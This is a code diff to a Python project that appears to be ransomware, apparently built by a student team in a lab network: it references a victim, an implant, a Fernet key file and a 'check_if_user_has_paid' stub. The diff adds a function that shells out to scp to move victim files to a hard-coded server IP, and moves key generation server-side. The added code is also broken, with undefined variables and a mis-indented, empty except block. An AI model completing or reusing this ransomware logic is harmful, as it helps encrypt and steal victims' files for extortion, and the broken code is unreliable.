@@ -7,20 +7,27 @@ import signal
 
 # Home directory
 home = expanduser("~")
+server_ip = "192.168.56.110"
 
-#TODO:
+
+#TODO Rafi/Yusef:
 def send_file_to_server(file_path):
-    return
+    try:
+        # Maybe replace the below two lines with Rafi's alternative method
+        upload_file_command = "scp " + server_username + "@" + server_ip + ":" + file_path_src + " " + root + path_to_dirs
+        os.system(upload_file_command)
+      except FileNotFoundError:
+        # Directory somehow not yet created
 
-#TODO:
+#TODO Subin:
 def check_if_user_has_paid():
     return False
 
-def generate_key():
-    if not os.path.isfile("./key.key"):
-        key = Fernet.generate_key()
-        with open("key.key", "wb") as the_key:
-            the_key.write(key)
+# def generate_key():
+#     if not os.path.isfile("./key.key"):
+#         key = Fernet.generate_key()
+#         with open("key.key", "wb") as the_key:
+#             the_key.write(key)
 
 
 # Method that lists all of the non-hidden, non-vital  directories bellow the inserted directory
@@ -114,7 +121,8 @@ def main(duration):
 
     #TODO: Replace this with Asymetric crypto
     #Generate key and make a key file
-    generate_key()
+    #generate_key()
+    # VICTIM DOESN'T GENERATE THE KEY PAIR! This key file should be sent to them from the server when Implant.py is run
     with open("key.key", "rb") as key:
         key = key.read()
 
